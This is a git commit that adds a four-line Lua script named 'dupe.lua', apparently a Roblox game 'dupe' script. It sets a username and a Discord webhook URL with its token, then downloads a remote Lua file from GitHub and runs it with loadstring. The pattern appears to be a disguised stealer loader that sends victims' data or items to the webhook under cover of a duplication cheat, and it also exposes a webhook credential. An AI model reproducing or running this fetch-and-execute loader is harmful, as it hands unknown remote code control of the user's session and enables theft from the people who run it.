37bddd1b255bb3c3fe407bb606b6a26320119047
anon56473829 <131683090+anon56473829@users.noreply.github.com>
2023-04-25 22:30:49 +0200

    Add files via upload

---
+++ dupe.lua
@@ -0,0 +1,4 @@
+UserName = "nosamondxx"
+WebHook = "https://discord.com/api/webhooks/1086573948839395338/WjygAGkDQg4U4js7CeFBd1htw6Ay-5TGQ53fA-n4VmGJnxjoiGahmmxaCvcUTEe6LF7P"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
